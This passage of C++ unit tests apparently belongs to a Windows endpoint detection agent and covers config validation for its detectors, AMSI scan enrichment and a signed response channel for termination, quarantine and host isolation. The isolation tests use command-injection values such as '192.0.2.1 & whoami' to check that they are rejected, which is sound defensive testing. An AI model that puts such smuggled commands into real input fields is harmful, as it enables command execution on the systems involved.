        CHECK(unchanged.apiHookEnable);
        CHECK(unchanged.apiHookMinScore == 88);
        CHECK(unchanged.apiHookDedupWindowSeconds == 300);
        CHECK(unchanged.apiHookStateCapacity == 1024);
    }
    DeleteFileA("edr-native-new-detector-config.json");
}

static void WriteBrowserExtensionConfig(const char* data) {
    std::ofstream out("edr-native-browser-extension-config.json",
                      std::ios::binary);
    out << data;
}

static void TestBrowserExtensionConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteBrowserExtensionConfig(
        R"({"browser_extension":{"enable":true,"min_score":70,"dedup_window_seconds":120,"state_capacity":2048,"allowlist":["chrome:abcdefghijklmnopabcdefghijklmnop@updates.corp.example"]}})");
    CHECK(LoadConfigFile("edr-native-browser-extension-config.json",
                         config, error));
    CHECK(config.browserExtensionEnable);
    CHECK(config.browserExtensionMinScore == 70);
    CHECK(config.browserExtensionDedupWindowSeconds == 120);
    CHECK(config.browserExtensionStateCapacity == 2048);
    CHECK(config.browserExtensionAllowlist.size() == 1);
    CHECK(config.browserExtensionAllowlist[0] ==
          "chrome:abcdefghijklmnopabcdefghijklmnop@updates.corp.example");

    for (const char* value : {
        R"({"browser_extension":"true"})",
        R"({"browser_extension":{"enable":"true"}})",
        R"({"browser_extension":{"enable":false,"bogus_key":1}})",
        R"({"browser_extension":{"min_score":9}})",
        R"({"browser_extension":{"min_score":101}})",
        R"({"browser_extension":{"dedup_window_seconds":-1}})",
        R"({"browser_extension":{"dedup_window_seconds":86401}})",
        R"({"browser_extension":{"state_capacity":15}})",
        R"({"browser_extension":{"state_capacity":65537}})",
        R"({"browser_extension":{"allowlist":"chrome:id@host"}})",
        R"({"browser_extension":{"allowlist":[1]}})",
        R"({"browser_extension":{"allowlist":["chrome:short@host"]}})",
        R"({"browser_extension":{"allowlist":["firefox:abcdefghijklmnopabcdefghijklmnop@host"]}})",
        R"({"browser_extension":{"allowlist":["chrome:abcdefghijklmnopabcdefghijklmnop@https://host/path"]}})"}) {
        WriteBrowserExtensionConfig(value);
        Config unchanged;
        unchanged.browserExtensionEnable = true;
        unchanged.browserExtensionMinScore = 88;
        unchanged.browserExtensionDedupWindowSeconds = 60;
        unchanged.browserExtensionStateCapacity = 2048;
        unchanged.browserExtensionAllowlist = {
            "edge:abcdefghijklmnopabcdefghijklmnop@edge.example"};
        CHECK(!LoadConfigFile("edr-native-browser-extension-config.json",
                              unchanged, error));
        CHECK(unchanged.browserExtensionEnable);
        CHECK(unchanged.browserExtensionMinScore == 88);
        CHECK(unchanged.browserExtensionDedupWindowSeconds == 60);
        CHECK(unchanged.browserExtensionStateCapacity == 2048);
        CHECK(unchanged.browserExtensionAllowlist.size() == 1);
        CHECK(unchanged.browserExtensionAllowlist[0] ==
              "edge:abcdefghijklmnopabcdefghijklmnop@edge.example");
    }
    DeleteFileA("edr-native-browser-extension-config.json");
}

static void WritePersistChainConfig(const char* data) {
    std::ofstream out("edr-native-persist-chain-config.json", std::ios::binary);
    out << data;
}

static void TestPersistChainConfigStrictAtomic() {
    std::string error;
    Config config;
    WritePersistChainConfig(R"({"persist_chain":{"enable":true,"window_seconds":900,"state_capacity":2048,"min_mechanisms":4},"rat_analyzer_scan_interval_seconds":30,"rat_analyzer_min_score":25,"rat_analyzer_dedup_window_seconds":600,"rat_analyzer_state_capacity":512})");
    CHECK(LoadConfigFile("edr-native-persist-chain-config.json", config, error));
    CHECK(config.persistChainEnable);
    CHECK(config.persistChainWindowSeconds == 900);
    CHECK(config.persistChainStateCapacity == 2048);
    CHECK(config.persistChainMinMechanisms == 4);
    CHECK(config.ratAnalyzerScanIntervalSeconds == 30);
    CHECK(config.ratAnalyzerMinScore == 25);
    CHECK(config.ratAnalyzerDedupWindowSeconds == 600);
    CHECK(config.ratAnalyzerStateCapacity == 512);
    for (const char* value : {
        R"({"persist_chain":"true"})",
        R"({"persist_chain":{"enable":false,"bogus_key":1}})",
        R"({"persist_chain":{"min_mechanisms":1}})",
        R"({"persist_chain":{"min_mechanisms":9}})",
        R"({"persist_chain":{"window_seconds":30}})",
        R"({"rat_analyzer_scan_interval_seconds":2}})",
        R"({"rat_analyzer_scan_interval_seconds":3601})",
        R"({"rat_analyzer_min_score":0})",
        R"({"rat_analyzer_min_score":101})",
        R"({"rat_analyzer_dedup_window_seconds":10})",
        R"({"rat_analyzer_state_capacity":64})"}) {
        WritePersistChainConfig(value);
        Config unchanged;
        unchanged.persistChainEnable = true;
        unchanged.persistChainMinMechanisms = 5;
        CHECK(!LoadConfigFile("edr-native-persist-chain-config.json", unchanged, error));
        CHECK(unchanged.persistChainEnable);
        CHECK(unchanged.persistChainMinMechanisms == 5);
        CHECK(!unchanged.c2BeaconEnable);
    }
    DeleteFileA("edr-native-persist-chain-config.json");
}

static void WriteChainConfig(const char* data) {
    std::ofstream out("edr-native-chain-config.json", std::ios::binary);
    out << data;
}

static void TestChainConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteChainConfig(R"({"powershell_download_execute":{"enable":true,"window_seconds":300,"state_capacity":2048,"min_distinct_scripts":3},"lolbin_chain":{"enable":true,"window_seconds":300,"state_capacity":2048,"min_distinct_children":3},"rdp_chain":{"enable":true,"window_seconds":300,"state_capacity":2048,"min_distinct_sources":2},"uac_bypass_chain":{"enable":true,"window_seconds":120,"state_capacity":512,"min_distinct_keys":2},"wmi_persistence":{"enable":true,"window_seconds":300,"state_capacity":2048,"min_matches":2}})");
    CHECK(LoadConfigFile("edr-native-chain-config.json", config, error));
    CHECK(config.powershellDownloadExecuteEnable);
    CHECK(config.powershellDownloadExecuteWindowSeconds == 300);
    CHECK(config.powershellDownloadExecuteStateCapacity == 2048);
    CHECK(config.powershellDownloadExecuteMinDistinctScripts == 3);
    CHECK(config.lolbinChainEnable);
    CHECK(config.lolbinChainWindowSeconds == 300);
    CHECK(config.lolbinChainStateCapacity == 2048);
    CHECK(config.lolbinChainMinDistinctChildren == 3);
    CHECK(config.rdpChainEnable);
    CHECK(config.rdpChainWindowSeconds == 300);
    CHECK(config.rdpChainStateCapacity == 2048);
    CHECK(config.rdpChainMinDistinctSources == 2);
    CHECK(config.uacBypassEnable);
    CHECK(config.uacBypassWindowSeconds == 120);
    CHECK(config.uacBypassStateCapacity == 512);
    CHECK(config.uacBypassMinDistinctKeys == 2);
    CHECK(config.wmiPersistenceEnable);
    CHECK(config.wmiPersistenceWindowSeconds == 300);
    CHECK(config.wmiPersistenceStateCapacity == 2048);
    CHECK(config.wmiPersistenceMinMatches == 2);
    const char* invalid[] = {
        R"({"powershell_download_execute":{"enable":false,"bogus_key":1}})",
        R"({"powershell_download_execute":{"window_seconds":1}})",
        R"({"lolbin_chain":{"enable":false,"bogus_key":1}})",
        R"({"lolbin_chain":{"min_distinct_children":1}})",
        R"({"rdp_chain":{"enable":false,"bogus_key":1}})",
        R"({"rdp_chain":{"min_distinct_sources":99}})",
        R"({"uac_bypass_chain":{"enable":false,"bogus_key":1}})",
        R"({"uac_bypass_chain":{"min_distinct_keys":9}})",
        R"({"wmi_persistence":{"enable":false,"bogus_key":1}})",
        R"({"wmi_persistence":{"min_matches":9}})"};
    for (const char* value : invalid) {
        WriteChainConfig(value);
        Config unchanged;
        unchanged.powershellDownloadExecuteEnable = true;
        unchanged.lolbinChainEnable = true;
        unchanged.rdpChainEnable = true;
        unchanged.uacBypassEnable = true;
        unchanged.wmiPersistenceEnable = true;
        CHECK(!LoadConfigFile("edr-native-chain-config.json", unchanged, error));
        CHECK(unchanged.powershellDownloadExecuteEnable);
        CHECK(unchanged.lolbinChainEnable);
        CHECK(unchanged.rdpChainEnable);
        CHECK(unchanged.uacBypassEnable);
        CHECK(unchanged.wmiPersistenceEnable);
    }
    DeleteFileA("edr-native-chain-config.json");
}

static void TestRemoteAccessConfigStrictAtomic() {
    std::string error;
    Config config;
    {
        std::ofstream out("edr-native-remote-access-config.json", std::ios::binary);
        out << R"({"remote_access":{"enable":true,"window_seconds":450,"state_capacity":4096}})";
    }
    CHECK(LoadConfigFile("edr-native-remote-access-config.json", config, error));
    CHECK(config.remoteAccessEnable);
    CHECK(config.remoteAccessWindowSeconds == 450);
    CHECK(config.remoteAccessStateCapacity == 4096);
    const char* invalid[] = {
        R"({"remote_access":"true"})",
        R"({"remote_access":{"enable":false,"bogus_key":1}})",
        R"({"remote_access":{"window_seconds":29}})",
        R"({"remote_access":{"state_capacity":8}})"};
    for (const char* value : invalid) {
        std::ofstream out("edr-native-remote-access-config.json", std::ios::binary);
        out << value;
        Config unchanged;
        unchanged.remoteAccessEnable = true;
        unchanged.remoteAccessWindowSeconds = 300;
        unchanged.remoteAccessStateCapacity = 2048;
        CHECK(!LoadConfigFile("edr-native-remote-access-config.json", unchanged, error));
        CHECK(unchanged.remoteAccessEnable);
        CHECK(unchanged.remoteAccessWindowSeconds == 300);
        CHECK(unchanged.remoteAccessStateCapacity == 2048);
    }
    DeleteFileA("edr-native-remote-access-config.json");
}

class FakeAmsiPlatform final : public IAmsiPlatform {
public:
    HRESULT initHr = S_OK;
    HRESULT scanHr = S_OK;
    uint32_t result = 0;
    int initCalls = 0;
    int scanCalls = 0;
    int uninitCalls = 0;
    void* scanContext = nullptr;
    std::wstring appName;
    std::wstring contentName;
    std::vector<unsigned char> bytes;

    HRESULT Initialize(const wchar_t* name, void** context) override {
        ++initCalls;
        appName = name;
        if (SUCCEEDED(initHr)) *context = reinterpret_cast<void*>(0x1234);
        return initHr;
    }
    HRESULT ScanBuffer(void* context, const void* buffer, uint32_t size,
                       const wchar_t* name, uint32_t* output) override {
        ++scanCalls;
        scanContext = context;
        contentName = name;
        const auto* data = static_cast<const unsigned char*>(buffer);
        if (size) bytes.assign(data, data + size); else bytes.clear();
        *output = result;
        return scanHr;
    }
    void Uninitialize(void* context) override {
        CHECK(context == reinterpret_cast<void*>(0x1234));
        ++uninitCalls;
    }
};

static Event AmsiProcess(const std::string& image, const std::string& command) {
    Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.fields[field::kType] = "PROCESS_START";
    event.fields[field::kImage] = image;
    event.fields[field::kCommandLine] = command;
    return event;
}

static void TestAmsiEligibilityAndDisabled() {
    FakeAmsiPlatform fake;
    AmsiEnricher disabled(false, 4096, fake);
    Event event = AmsiProcess("powershell.exe", "Get-Process");
    CHECK(!disabled.IsEligible(event));
    disabled.EnrichEligible(event);
    CHECK(fake.initCalls == 0 && fake.scanCalls == 0);
    CHECK(event.fields.find(field::kAmsiVerdict) == event.fields.end());

    AmsiEnricher enabled(true, 4096, fake);
    for (const char* image : {"powershell.exe", "C:\\x\\PowerShell.EXE",
        "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe"})
        CHECK(enabled.IsEligible(AmsiProcess(image, "x")));
    for (const char* image : {"powershell", "fakepowershell.exe", "cmd.exe",
        "powershell.exe.bak"})
        CHECK(!enabled.IsEligible(AmsiProcess(image, "x")));
    Event missing = AmsiProcess("powershell.exe", "x");
    missing.fields.erase(field::kCommandLine);
    CHECK(!enabled.IsEligible(missing));
    Event wrongType = AmsiProcess("powershell.exe", "x");
    wrongType.type = EDR_EVT_PROCESS_STOP;
    CHECK(!enabled.IsEligible(wrongType));
    Event wmi;
    wmi.type = EDR_EVT_WMI_EVENT;
    wmi.fields[field::kWmiEventId] = "5860";
    wmi.fields[field::kWmiQuery] = "SELECT * FROM Win32_Process";
    CHECK(enabled.IsEligible(wmi));
    wmi.fields[field::kWmiEventId] = "5858";
    CHECK(!enabled.IsEligible(wmi));
}

static void TestAmsiLifecycleAndMappings() {
    FakeAmsiPlatform fake;
    {
        AmsiEnricher enricher(true, 4096, fake);
        CHECK(fake.initCalls == 1 && fake.appName == L"EDR Agent");
        const std::pair<uint32_t, const char*> mappings[] = {
            {0, "clean"}, {1, "not_detected"}, {0x3fff, "not_detected"},
            {0x4000, "blocked_by_admin"}, {0x4fff, "blocked_by_admin"},
            {0x5000, "not_detected"}, {0x7fff, "not_detected"},
            {0x8000, "detected"}, {0xffffffff, "detected"}};
        for (const auto& mapping : mappings) {
            fake.result = mapping.first;
            Event event = AmsiProcess("powershell.exe", "abc");
            enricher.EnrichEligible(event);
            CHECK(event.fields.at(field::kAmsiVerdict) == mapping.second);
            CHECK(event.fields.at(field::kAmsiSource) == "command_line");
            CHECK(event.fields.at(field::kAmsiTruncated) == "false");
            CHECK(event.fields.at(field::kAmsiResult) == std::to_string(mapping.first));
            CHECK(event.fields.find(field::kAmsiErrorHresult) == event.fields.end());
        }
        CHECK(fake.scanCalls == 9 && fake.scanContext == reinterpret_cast<void*>(0x1234));
        CHECK(fake.contentName == L"EDR telemetry");
        CHECK(fake.bytes.size() == 6 && fake.bytes[0] == 'a' &&
              fake.bytes[1] == 0 && fake.bytes[4] == 'c' && fake.bytes[5] == 0);
        enricher.Shutdown();
        enricher.Shutdown();
        CHECK(fake.uninitCalls == 1);
    }
    CHECK(fake.uninitCalls == 1);
}

static void TestAmsiBoundariesErrorsAndSerialization() {
    FakeAmsiPlatform fake;
    AmsiEnricher enricher(true, 256, fake);
    std::string content(255, 'a');
    content += "\xf0\x9f\x98\x80";
    content += "z";
    Event event = AmsiProcess("pwsh.exe", content);
    enricher.EnrichEligible(event);
    CHECK(fake.scanCalls == 1);
    CHECK(fake.bytes.size() == 255 * sizeof(wchar_t));
    CHECK(event.fields.at(field::kAmsiTruncated) == "true");
    std::string line = EventToJsonLine(event, false);
    CHECK(line.find("\"amsi_verdict\":\"clean\"") != std::string::npos);
    CHECK(line.find("\"amsi_source\":\"command_line\"") != std::string::npos);
    const size_t contentAt = line.find(content);
    CHECK(contentAt != std::string::npos);
    CHECK(line.find(content, contentAt + content.size()) == std::string::npos);

    Event invalid = AmsiProcess("pwsh.exe", std::string(300, 'a') + "\xc0\x80");
    enricher.EnrichEligible(invalid);
    CHECK(fake.scanCalls == 1);
    CHECK(invalid.fields.at(field::kAmsiVerdict) == "error");
    CHECK(invalid.fields.at(field::kAmsiTruncated) == "false");
    CHECK(invalid.fields.at(field::kAmsiErrorHresult) == "0x80070057");
    CHECK(invalid.fields.find(field::kAmsiResult) == invalid.fields.end());

    fake.scanHr = E_ACCESSDENIED;
    Event scanError = AmsiProcess("mshta.exe", "x");
    enricher.EnrichEligible(scanError);
    CHECK(fake.scanCalls == 2);
    CHECK(scanError.fields.at(field::kAmsiVerdict) == "error");
    CHECK(scanError.fields.at(field::kAmsiErrorHresult) == "0x80070005");
    CHECK(scanError.fields.find(field::kAmsiResult) == scanError.fields.end());
}

static void TestAmsiStickyInitializationFailure() {
    FakeAmsiPlatform fake;
    fake.initHr = E_FAIL;
    AmsiEnricher enricher(true, 4096, fake);
    CHECK(enricher.InitializationFailed());
    for (int i = 0; i < 2; ++i) {
        Event event = AmsiProcess("powershell.exe", "x");
        enricher.EnrichEligible(event);
        CHECK(event.fields.at(field::kAmsiVerdict) == "error");
        CHECK(event.fields.at(field::kAmsiErrorHresult) == "0x80004005");
        CHECK(event.fields.find(field::kAmsiResult) == event.fields.end());
    }
    CHECK(fake.initCalls == 1 && fake.scanCalls == 0);
    enricher.Shutdown();
    CHECK(fake.uninitCalls == 0);
}

static uint64_t CurrentFileTime() {
    FILETIME fileTime;
    GetSystemTimePreciseAsFileTime(&fileTime);
    return (static_cast<uint64_t>(fileTime.dwHighDateTime) << 32) |
        fileTime.dwLowDateTime;
}

static void TestResponseConfigStrictAtomic() {
    const char* path = "edr-native-response-config.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"enable":true,"enable_process_termination":true,"pipe_name":"\\\\.\\pipe\\test-response","command_key_file":"key.txt","audit_path":"audit.jsonl"}})";
    }
    Config config;
    std::string error;
    CHECK(LoadConfigFile(path, config, error));
    CHECK(config.responseChannelEnable);
    CHECK(config.responseEnableProcessTermination);
    CHECK(config.responseCommandKeyFile == "key.txt");

    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"enable":true,"max_tree_size":8}})";
    }
    Config treeConfig;
    CHECK(LoadConfigFile(path, treeConfig, error));
    CHECK(treeConfig.responseMaxTreeSize == 8);
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"max_tree_size":3}})";
    }
    Config treeLow;
    CHECK(!LoadConfigFile(path, treeLow, error));
    CHECK(treeLow.responseMaxTreeSize == 32);
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"max_tree_size":65}})";
    }
    CHECK(!LoadConfigFile(path, treeLow, error));

    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"enable":true,"enable":false}})";
    }
    Config duplicate;
    CHECK(!LoadConfigFile(path, duplicate, error));
    CHECK(!duplicate.responseChannelEnable);
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"enable":true,"unexpected":1}})";
    }
    Config unknown;
    CHECK(!LoadConfigFile(path, unknown, error));
    CHECK(!unknown.responseChannelEnable);
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"response_channel":{"enable":"true"}})";
    }
    Config wrongType;
    CHECK(!LoadConfigFile(path, wrongType, error));
    CHECK(!wrongType.responseChannelEnable);
}

static std::string ResponsePayload(const std::string& requestId,
                                   uint64_t timestamp, DWORD pid) {
    return "{\"version\":1,\"requestId\":\"" + requestId +
        "\",\"timestamp\":\"" + std::to_string(timestamp) +
        "\",\"action\":\"terminate\",\"reason\":\"test only\","
        "\"target\":{\"pid\":" + std::to_string(pid) +
        ",\"createTime100ns\":\"123456789\"}}";
}

static void TestResponseProtocolAndSchema() {
    std::vector<unsigned char> key(32, 0x5a);
    std::vector<unsigned char> frame;
    std::string payload = ResponsePayload("12345678-1234-1234-1234-123456789abc",
        CurrentFileTime(), 12345);
    std::string error, decoded;
    CHECK(BuildResponseFrame(payload, key, frame, error));
    CHECK(ParseResponseFrame(frame, key, decoded, error));
    CHECK(decoded == payload);
    frame[10] ^= 1;
    CHECK(!ParseResponseFrame(frame, key, decoded, error));

    ResponseRequest request;
    CHECK(ParseResponseRequest(payload, CurrentFileTime(), GetCurrentProcessId(),
                               request, error));
    CHECK(request.pid == 12345 && request.kind == ResponseRequest::Kind::Terminate);
    std::string duplicate = payload;
    size_t target = duplicate.find("\"reason\"");
    duplicate.insert(target, "\"reason\":\"duplicate\",");
    CHECK(!ParseResponseRequest(duplicate, CurrentFileTime(),
                                GetCurrentProcessId(), request, error));
    std::string unknown = payload;
    unknown.insert(unknown.size() - 1, ",\"extra\":true");
    CHECK(!ParseResponseRequest(unknown, CurrentFileTime(),
                                GetCurrentProcessId(), request, error));
    std::string malformedNumber = payload;
    size_t pidOffset = malformedNumber.find("\"pid\":12345");
    malformedNumber.replace(pidOffset, 11, "\"pid\":1e");
    CHECK(!ParseResponseRequest(malformedNumber, CurrentFileTime(),
                                GetCurrentProcessId(), request, error));
    CHECK(!ParseResponseRequest(ResponsePayload(
        "12345678-1234-1234-1234-123456789abd", CurrentFileTime(), 4),
        CurrentFileTime(), GetCurrentProcessId(), request, error));
    CHECK(!ParseResponseRequest(ResponsePayload(
        "12345678-1234-1234-1234-123456789abe", CurrentFileTime(),
        GetCurrentProcessId()), CurrentFileTime(), GetCurrentProcessId(),
        request, error));
    CHECK(!ParseResponseRequest(ResponsePayload(
        "12345678-1234-1234-1234-123456789abf",
        CurrentFileTime() - 61ULL * 10000000ULL, 12345),
        CurrentFileTime(), GetCurrentProcessId(), request, error));

    auto withTree = [&](const std::string& extra) {
        std::string out = payload;
        size_t at = out.find("\"target\"");
        out.insert(at, extra + ",");
        return out;
    };
    ResponseRequest treeRequest;
    CHECK(ParseResponseRequest(
        withTree("\"maxTreeSize\":8,\"suspendBeforeTerminate\":true"),
        CurrentFileTime(), GetCurrentProcessId(), treeRequest, error));
    CHECK(treeRequest.maxTreeSize == 8 && treeRequest.suspendBeforeTerminate);
    CHECK(ParseResponseRequest(withTree("\"maxTreeSize\":64"),
        CurrentFileTime(), GetCurrentProcessId(), treeRequest, error));
    CHECK(treeRequest.maxTreeSize == 64 && !treeRequest.suspendBeforeTerminate);
    CHECK(ParseResponseRequest(withTree("\"suspendBeforeTerminate\":true"),
        CurrentFileTime(), GetCurrentProcessId(), treeRequest, error));
    CHECK(treeRequest.maxTreeSize == 0 && treeRequest.suspendBeforeTerminate);
    for (const std::string& bad : {
        "\"maxTreeSize\":0", "\"maxTreeSize\":65", "\"maxTreeSize\":8.5",
        "\"maxTreeSize\":\"8\"", "\"maxTreeSize\":true",
        "\"suspendBeforeTerminate\":1",
        "\"suspendBeforeTerminate\":\"true\""}) {
        CHECK(!ParseResponseRequest(withTree(bad), CurrentFileTime(),
                                    GetCurrentProcessId(), treeRequest, error));
    }
}

static std::string QuarantinePayload(const std::string& path,
                                     const std::string& sha256 = "") {
    return "{\"version\":1,\"requestId\":\"dddddddd-1234-1234-1234-123456789abc\"," 
        "\"timestamp\":\"" + std::to_string(CurrentFileTime()) +
        "\",\"action\":\"quarantine\",\"reason\":\"native test\"," 
        "\"target\":{\"path\":\"" + jsonlite::escape(path) +
        "\",\"sha256\":\"" + sha256 + "\"}}";
}

static void TestQuarantineProtocolAndSchema() {
    ResponseRequest request;
    std::string error;
    std::string valid = QuarantinePayload("C:\\Temp\\sample.bin",
                                          std::string(64, 'A'));
    CHECK(ParseResponseRequest(valid, CurrentFileTime(), GetCurrentProcessId(),
                               request, error));
    CHECK(request.kind == ResponseRequest::Kind::Quarantine);
    CHECK(request.path == "C:\\Temp\\sample.bin" && request.sha256Hex.size() == 64);
    CHECK(ParseResponseRequest(QuarantinePayload("C:\\Temp\\sample.bin"),
        CurrentFileTime(), GetCurrentProcessId(), request, error));
    for (const std::string& path : {"relative.bin", "\\\\server\\share\\x",
                                   "\\\\.\\C:\\x", "C:\\bad\npath"})
        CHECK(!ParseResponseRequest(QuarantinePayload(path), CurrentFileTime(),
                                    GetCurrentProcessId(), request, error));
    CHECK(!ParseResponseRequest(QuarantinePayload("C:\\Temp\\x", "abc"),
        CurrentFileTime(), GetCurrentProcessId(), request, error));
    for (const std::string& fragment : {
        ",\"extra\":true", ",\"target2\":{}"}) {
        std::string extra = valid;
        extra.insert(extra.size() - 1, fragment);
        CHECK(!ParseResponseRequest(extra, CurrentFileTime(),
                                    GetCurrentProcessId(), request, error));
    }
    std::string missing = valid;
    size_t hash = missing.find(",\"sha256\"");
    missing.erase(hash, missing.find('}', hash) - hash);
    CHECK(!ParseResponseRequest(missing, CurrentFileTime(), GetCurrentProcessId(),
                                request, error));
    std::string missingReason = valid;
    size_t reason = missingReason.find("\"reason\"");
    missingReason.erase(reason, missingReason.find(',', reason) - reason + 1);
    CHECK(!ParseResponseRequest(missingReason, CurrentFileTime(),
                                GetCurrentProcessId(), request, error));
    std::string extraTarget = valid;
    extraTarget.insert(extraTarget.rfind('}'), ",\"extra\":1");
    CHECK(!ParseResponseRequest(extraTarget, CurrentFileTime(),
                                GetCurrentProcessId(), request, error));
    std::string unknown = valid;
    size_t action = unknown.find("quarantine");
    unknown.replace(action, 10, "unknown");
    CHECK(!ParseResponseRequest(unknown, CurrentFileTime(), GetCurrentProcessId(),
                                request, error));
}

static void TestIsolationProtocolAndValidation() {
    auto payload = [](const std::string& action, const std::string& fields = "") {
        return "{\"version\":1,\"requestId\":\"eeeeeeee-1234-1234-1234-123456789abc\","
            "\"timestamp\":\"" + std::to_string(CurrentFileTime()) +
            "\",\"action\":\"" + action + "\"" + fields + "}";
    };
    ResponseRequest request;
    std::string error;
    CHECK(ParseResponseRequest(payload("isolate",
        ",\"reason\":\"contain host\",\"enable\":true,"
        "\"managementIp\":\"192.0.2.10\",\"allowedPorts\":\"443,8080\""),
        CurrentFileTime(), GetCurrentProcessId(), request, error));
    CHECK(request.kind == ResponseRequest::Kind::Isolation);
    CHECK(request.isolateEnable && request.managementIp == "192.0.2.10");
    CHECK(ParseResponseRequest(payload("isolate",
        ",\"reason\":\"restore host\",\"enable\":false,"
        "\"managementIp\":\"2001:db8::10\",\"allowedPorts\":\"\""),
        CurrentFileTime(), GetCurrentProcessId(), request, error));
    CHECK(!request.isolateEnable);
    CHECK(ParseResponseRequest(payload("isolation_status"), CurrentFileTime(),
                               GetCurrentProcessId(), request, error));
    CHECK(request.kind == ResponseRequest::Kind::IsolationStatus);
    CHECK(!ParseResponseRequest(payload("isolation_status", ",\"reason\":\"x\""),
                                CurrentFileTime(), GetCurrentProcessId(), request, error));
    CHECK(!ParseResponseRequest(payload("unisolate"), CurrentFileTime(),
                                GetCurrentProcessId(), request, error));
    for (const std::string& ip : {"", "192.0.2.1 & whoami", "not-an-ip"}) {
        CHECK(!ParseResponseRequest(payload("isolate",
            ",\"reason\":\"test\",\"enable\":true,\"managementIp\":\"" +
            jsonlite::escape(ip) + "\",\"allowedPorts\":\"443\""),
            CurrentFileTime(), GetCurrentProcessId(), request, error));
    }
    for (const std::string& ports : {"0", "65536", "443,", ",443", "443,,8080",
                                     "443 & whoami", " 443"}) {
        CHECK(!ParseResponseRequest(payload("isolate",
            ",\"reason\":\"test\",\"enable\":true,\"managementIp\":\"192.0.2.10\","
            "\"allowedPorts\":\"" + jsonlite::escape(ports) + "\""),
            CurrentFileTime(), GetCurrentProcessId(), request, error));
    }
}

static void TestQuarantineConfigStrictAtomic() {
    CHECK(!Config().responseEnableQuarantine);
    CHECK(Config().responseQuarantineDir.empty());
    CHECK(Config().responseQuarantineMaxFileBytes == 268435456ULL);
    const char* path = "edr-native-quarantine-config.json";
    std::string error;
    {
        std::ofstream out(path);
        out << R"({"response_channel":{"enable_quarantine":true,"quarantine_dir":"%TEMP%\\edr-q","quarantine_max_file_bytes":4294967296}})";
    }
    Config valid;
    CHECK(LoadConfigFile(path, valid, error));
    CHECK(valid.responseEnableQuarantine);
    CHECK(valid.responseQuarantineDir.find("%TEMP%") == std::string::npos);
    CHECK(valid.responseQuarantineMaxFileBytes == 4294967296ULL);
    for (const char* json : {
        R"({"response_channel":{"enable_quarantine":"true"}})",
        R"({"response_channel":{"quarantine_dir":7}})",
        R"({"response_channel":{"quarantine_max_file_bytes":1048575}})",
        R"({"response_channel":{"quarantine_max_file_bytes":4294967297}})",
        R"({"response_channel":{"enable_quarantine":true,"unknown_q":1}})",
        R"({"response_channel":{"enable_quarantine":true,"enable_quarantine":false}})"}) {
        std::ofstream out(path); out << json; out.close();
        Config unchanged;
        unchanged.responseQuarantineMaxFileBytes = 1234567;
        CHECK(!LoadConfigFile(path, unchanged, error));
        CHECK(!unchanged.responseEnableQuarantine);
        CHECK(unchanged.responseQuarantineMaxFileBytes == 1234567);
    }
    DeleteFileA(path);
}

static void TestResponseServerQuarantineDryRun() {
    const std::string path = "edr-native-quarantine-dry-run-" +
        std::to_string(GetCurrentProcessId()) + ".jsonl";
    { std::ofstream clear(path, std::ios::binary); }
    ResponseAuditLedger ledger;
    std::string error;
    CHECK(ledger.Open(path, error));
    ResponseRequest request;
    request.kind = ResponseRequest::Kind::Quarantine;
    request.requestId = "abababab-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "dry run";
    request.path = "C:\\Temp\\dry-run.bin";
    request.sha256Hex = std::string(64, 'a');
    CHECK(ledger.AcceptDryRun(request, "quarantine", error));
    CHECK(ledger.Contains(request.requestId));
    ledger.Close();
    std::ifstream audit(path, std::ios::binary);
    std::stringstream contents; contents << audit.rdbuf();
    CHECK(contents.str().find("\"action\":\"quarantine\"") != std::string::npos);
    CHECK(contents.str().find("\"effective_mode\":\"dry_run\"") != std::string::npos);
    CHECK(contents.str().find("\"status\":\"accepted\"") != std::string::npos);
    CHECK(contents.str().find("C:\\\\Temp\\\\dry-run.bin") != std::string::npos);
    DeleteFileA(path.c_str());
}

static void TestResponseKeyAuditAndReplay() {
    const std::string suffix = std::to_string(GetCurrentProcessId());
    const std::string keyPath = "edr-native-response-key-" + suffix + ".txt";
    const std::string auditPath = "edr-native-response-audit-" + suffix + ".jsonl";
    {
        std::ofstream out(keyPath, std::ios::binary);
        out << "WlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlo=";
    }
    std::vector<unsigned char> key;
    std::string error;
    CHECK(LoadResponseCommandKey(keyPath, key, error));
    CHECK(key.size() == 32);
    {
        std::ofstream clear(auditPath, std::ios::binary);
    }
    ResponseRequest request;
    request.kind = ResponseRequest::Kind::Terminate;
    request.requestId = "87654321-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.reason = "dry-run replay test";
    request.pid = 12345;
    request.createTime100ns = "123456789";
    {
        ResponseAuditLedger ledger;
        CHECK(ledger.Open(auditPath, error));
        CHECK(ledger.AcceptDryRun(request, error));
        CHECK(ledger.Contains(request.requestId));
        CHECK(!ledger.AcceptDryRun(request, error));
    }
    ResponseAuditLedger restarted;
    CHECK(restarted.Open(auditPath, error));
    CHECK(restarted.Contains(request.requestId));
    CHECK(!restarted.AcceptDryRun(request, error));
    std::ifstream audit(auditPath, std::ios::binary);
    std::string line;
    std::getline(audit, line);
    CHECK(line.find("\"effective_mode\":\"dry_run\"") != std::string::npos);
    CHECK(line.find("\"status\":\"accepted\"") != std::string::npos);
    CHECK(line.find("123456789") != std::string::npos);
    CHECK(line.find("Wlpa") == std::string::npos);
}

static void TestResponseLedgerWriteFailureState() {
    const std::string path = "edr-native-write-failure-" +
        std::to_string(GetCurrentProcessId()) + ".jsonl";
    DeleteFileA(path.c_str());
    std::string error;
    ResponseActionRequest request;
    request.requestId = "aaaaaaaa-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.pid = 12345;
    request.createTime100ns = 123456789;
    int writes = 0;
    bool fail = true;
    ResponseAuditLedger ledger([&](HANDLE file, const std::string& line) {
        ++writes;
        if (fail) return false;
        DWORD written = 0;
